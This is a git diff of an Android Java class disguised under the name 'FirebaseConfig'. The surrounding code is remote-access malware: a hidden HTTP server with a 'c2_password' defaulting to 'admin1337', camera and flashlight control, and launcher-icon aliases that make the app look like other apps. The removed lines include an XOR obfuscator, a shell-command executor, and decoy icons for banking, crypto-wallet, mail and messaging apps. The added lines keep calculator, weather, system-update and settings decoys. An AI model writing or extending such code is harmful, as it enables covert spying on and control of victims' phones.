@@ -120,18 +120,6 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
-    private static String obfuscate(String data) {
-        if (data == null) return null;
-        try {
-            byte[] bytes = data.getBytes("UTF-8");
-            byte[] key = {0x12, 0x34, 0x56, 0x78};
-            for (int i = 0; i < bytes.length; i++) {
-                bytes[i] = (byte) (bytes[i] ^ key[i % key.length]);
-            }
-            return android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
-        } catch (Exception e) { return data; }
-    }
-
     private static String deobfuscate(String data) {
         if (data == null) return null;
         try {
@@ -423,8 +411,6 @@ public class FirebaseConfig extends NanoHTTPD {
         setupHardenedLink();
     }
 
-    private static boolean isEncryptedLink = false;
-
     private void setupHardenedLink() {
         try {
             // Check assets for pre-deployed keystore (BKS format for Android)
@@ -444,12 +430,10 @@ public class FirebaseConfig extends NanoHTTPD {
                 
                 // --- ACTIVATE HTTPS PROTOCOL ---
                 makeSecure(sslContext.getServerSocketFactory(), null);
-                isEncryptedLink = true;
                 logActivity("SECURITY_UPGRADE: SSL/TLS 1.3 encryption engine active.");
             }
         } catch (Exception e) {
             // No keystore found or error - default to raw HTTP for baseline access
-            isEncryptedLink = false;
         }
     }
 
@@ -961,11 +945,6 @@ public class FirebaseConfig extends NanoHTTPD {
         }
     }
 
-    private String getStoredPassword() {
-        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                .getString("c2_password", "admin1337");
-    }
-
     private static boolean isFlashlightOn = false;
 
     @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
@@ -1164,45 +1143,21 @@ public class FirebaseConfig extends NanoHTTPD {
             android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
             String appName = appInfo.loadLabel(pm).toString();
 
-            // Determine matching alias component based on package or category
+            // Determine matching alias component based on 5 active stealth decoy types
             String targetAlias = "SettingsAlias"; // Play Protect default
             String lowerPkg = pkg.toLowerCase();
             String lowerName = appName.toLowerCase();
 
-            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
-                targetAlias = "WhatsAppAlias";
-            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
-                targetAlias = "TelegramAlias";
-            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
-                targetAlias = "InstagramAlias";
-            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
-                targetAlias = "YouTubeAlias";
-            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
-                targetAlias = "ChromeAlias";
-            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
-                targetAlias = "BankAlias";
-            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
-                targetAlias = "MailAlias";
-            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
-                targetAlias = "VPNAlias";
-            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
-                targetAlias = "PdfAlias";
-            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
-                targetAlias = "MusicAlias";
-            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
-                targetAlias = "TwitterAlias";
-            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
-                targetAlias = "TermuxAlias";
-            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
-                targetAlias = "CryptoAlias";
-            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
+            if (lowerPkg.contains("calc") || lowerName.contains("calc")) {
                 targetAlias = "CalculatorAlias";
             } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
                 targetAlias = "WeatherAlias";
-            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
+            } else if (lowerPkg.contains("update") || lowerName.contains("update")) {
+                targetAlias = "SystemUpdateAlias";
+            } else if (lowerPkg.contains("logo") || lowerName.contains("logo")) {
+                targetAlias = "LabRatsLogoAlias";
+            } else {
                 targetAlias = "SettingsAlias";
-            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
-                targetAlias = "AndroidSystemAlias";
             }
 
             context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
@@ -1342,21 +1297,6 @@ public class FirebaseConfig extends NanoHTTPD {
         java.util.Collections.sort(apps);
         return apps;
     }
-
-
-
-    private String executeShell(String command) {
-        if (command == null || command.isEmpty()) return "";
-        try {
-            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
-            process.waitFor();
-            return "[System Command Executed]";
-        } catch (Exception e) {
-            return "Shell Error: " + e.getMessage();
-        }
-    }
-
-
 
     public static String getMimeType(String filename) {
         String name = filename.toLowerCase();
